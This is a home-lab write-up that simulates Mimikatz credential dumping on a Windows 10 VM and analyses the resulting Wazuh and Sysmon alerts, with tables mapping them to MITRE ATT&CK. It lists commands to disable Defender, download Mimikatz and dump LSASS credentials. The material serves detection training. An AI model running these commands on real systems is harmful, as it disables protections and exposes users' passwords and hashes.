# SOC Home Lab: Mimikatz Credential Dumping Detection with Wazuh

A hands-on SOC (Security Operations Center) lab scenario demonstrating how **Wazuh SIEM** detects Mimikatz credential dumping activity on a Windows 10 endpoint using Sysmon telemetry.

---

## 🧪 Lab Overview

| Field | Details |
|-------|---------|
| **Platform** | Windows 10 (Victim VM) |
| **SIEM** | Wazuh |
| **Detection Agent** | Sysmon (System Monitor) |
| **Attack Tool** | Mimikatz v2.2.0 |
| **MITRE ATT&CK** | T1003 – OS Credential Dumping, T1105 – Ingress Tool Transfer, T1055 – Process Injection |
| **Alert Severity** | Critical |

---

##  Lab Architecture
```
[Windows 10 Victim VM]
        |
   Sysmon (telemetry)
        |
   Wazuh Agent
        |
  [Wazuh Manager / SIEM Dashboard]
        |
   Alert Analysis & Table
```

---

##  Prerequisites

- Windows 10 VM (run as **Administrator**)
- Wazuh Agent installed and enrolled to Wazuh Manager
- Sysmon installed with a detection ruleset (e.g., SwiftOnSecurity config)
- Wazuh Manager running (can be on a separate Linux VM or server)
- Internet access on the victim VM (to download Mimikatz)

---

##  Step-by-Step Attack Simulation

### Step 1 — Disable Windows Defender (Temporarily)

> ⚠️ For lab/testing purposes only. Never do this on a production machine.

Open **PowerShell as Administrator** and run:
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

This prevents Defender from blocking the Mimikatz download.

---

### Step 2 — Download Mimikatz
```powershell
Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip" `
  -OutFile "$env:TEMP\mimi.zip"
```

> **What happens here:** PowerShell downloads the Mimikatz archive into the user's `%TEMP%` directory.
> Sysmon logs this process activity under **Event ID 11 (File Created)**.

---

### Step 3 — Extract the Archive
```powershell
Expand-Archive "$env:TEMP\mimi.zip" -DestinationPath "$env:TEMP\mimi"
```

> **What happens here:** The archive is extracted to `C:\Users\<user>\AppData\Local\Temp\mimi\`, creating:
> - `x64\mimikatz.exe`
> - `x64\mimilib.dll`
> - `x64\mimispool.dll`
> - `Win32\mimikatz.exe`
> - `Win32\mimilib.dll`
> - `Win32\mimispool.dll`
> - `Win32\mimilove.exe`
>
> Each file drop triggers a **Sysmon Event ID 11** alert tagged as **T1105 – Ingress Tool Transfer**.

---

### Step 4 — Run Mimikatz
```powershell
cd "$env:TEMP\mimi\x64"
.\mimikatz.exe
```

---

### Step 5 — Execute Credential Dumping Commands

Inside the Mimikatz interactive prompt:
```
privilege::debug
sekurlsa::logonpasswords
exit
```

> **What happens here:**
> - `privilege::debug` — Requests `SeDebugPrivilege` to access `lsass.exe` memory
> - `sekurlsa::logonpasswords` — Dumps plaintext passwords, NTLM hashes, and Kerberos tickets from LSASS memory
> - This triggers Sysmon **Event ID 1 (Process Create)** and potential **T1055 – Process Injection** alerts in Wazuh

---

## 🔍 Wazuh Alert Analysis

After running the simulation, navigate to the **Wazuh Dashboard → Security Alerts** and filter by the agent name or time range.

### Alerts Generated

The following critical alerts were observed:

| Time (UTC) | Agent | Target Filename | Event ID | System Message | Rule Description | MITRE ID |
|---|---|---|---|---|---|---|
| 2026-03-27 14:10:35 | DESKTOP-0UJQ90E\bilyg | `...\mimi\x64\mimispool.dll` | 11 | File created by powershell.exe | Executable file dropped in folder commonly used by malware | T1105 |
| 2026-03-27 14:10:35 | DESKTOP-0UJQ90E\bilyg | `...\mimi\x64\mimilib.dll` | 11 | File created by powershell.exe | Executable file dropped in folder commonly used by malware | T1105 |
| 2026-03-27 14:10:35 | DESKTOP-0UJQ90E\bilyg | `...\mimi\x64\mimikatz.exe` | 11 | File created by powershell.exe | Executable file dropped in folder commonly used by malware | T1105 |
| 2026-03-27 14:10:34 | DESKTOP-0UJQ90E\bilyg | `...\mimi\Win32\mimispool.dll` | 11 | File created by powershell.exe | Executable file dropped in folder commonly used by malware | T1105 |
| 2026-03-27 14:10:34 | DESKTOP-0UJQ90E\bilyg | `...\mimi\Win32\mimilove.exe` | 11 | File created by powershell.exe | Executable file dropped in folder commonly used by malware | T1105 |
| 2026-03-27 14:10:34 | DESKTOP-0UJQ90E\bilyg | `...\mimi\Win32\mimilib.dll` | 11 | File created by powershell.exe | Executable file dropped in folder commonly used by malware | T1105 |
| 2026-03-27 14:10:34 | DESKTOP-0UJQ90E\bilyg | `...\mimi\Win32\mimikatz.exe` | 11 | File created by powershell.exe | Executable file dropped in folder commonly used by malware | T1105 |
| 2026-03-27 13:51:24 | DESKTOP-0UJQ90E\bilyg | *(Process event)* | 1 | explorer.exe spawned from svchost.exe | Sysmon – Suspicious Process – explorer.exe | T1055 |

---

## 📊 Key Sysmon Fields Captured

| Sysmon Field | Description |
|---|---|
| `UtcTime` | Exact timestamp of the event |
| `ProcessGuid` | Unique GUID identifying the process |
| `ProcessId` | PID of the creating process |
| `Image` | Full path of the process that triggered the event |
| `TargetFilename` | File path of the dropped artifact |
| `RuleName` | Type tag (e.g., `EXE`, `DLL`) matched by Sysmon rule |
| `User` | Account under which the action occurred |
| `Hashes` | MD5, SHA256, IMPHASH of the executable |

---

## 🧠 MITRE ATT&CK Mapping

| Technique ID | Name | Description |
|---|---|---|
| **T1105** | Ingress Tool Transfer | Mimikatz binaries downloaded and dropped to `%TEMP%` via PowerShell |
| **T1003** | OS Credential Dumping | `sekurlsa::logonpasswords` extracts credentials from LSASS memory |
| **T1055** | Process Injection | Suspicious `explorer.exe` process spawned from `svchost.exe` |
| **T1059.001** | PowerShell | PowerShell used to download, extract, and stage the attack tool |

---

## 🛡️ Detection Summary

Wazuh successfully detected the full attack chain:

1. ✅ **Tool staging** — Multiple Mimikatz EXE and DLL files dropped in `%TEMP%` were flagged as **T1105**
2. ✅ **Suspicious process behavior** — Abnormal `explorer.exe` spawning detected as **T1055**
3. ✅ **PowerShell script policy test files** — Temporary `.ps1` files created by PowerShell execution were logged
4. ✅ **MITRE ATT&CK tags** — All alerts were automatically mapped to corresponding techniques in the Wazuh dashboard


## ⚠️ Disclaimer

> This lab is for **educational and authorized testing purposes only**.
> All activity was performed in an **isolated home lab environment**.
> Do NOT run Mimikatz or disable security controls on any system you do not own or have explicit written permission to test.

--

##  References

- [Mimikatz GitHub](https://github.com/gentilkiwi/mimikatz)
- [Wazuh Documentation](https://documentation.wazuh.com)
- [Sysmon - Microsoft Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
- [MITRE ATT&CK T1003](https://attack.mitre.org/techniques/T1003/)
- [MITRE ATT&CK T1105](https://attack.mitre.org/techniques/T1105/)
- [MITRE ATT&CK T1055](https://attack.mitre.org/techniques/T1055/)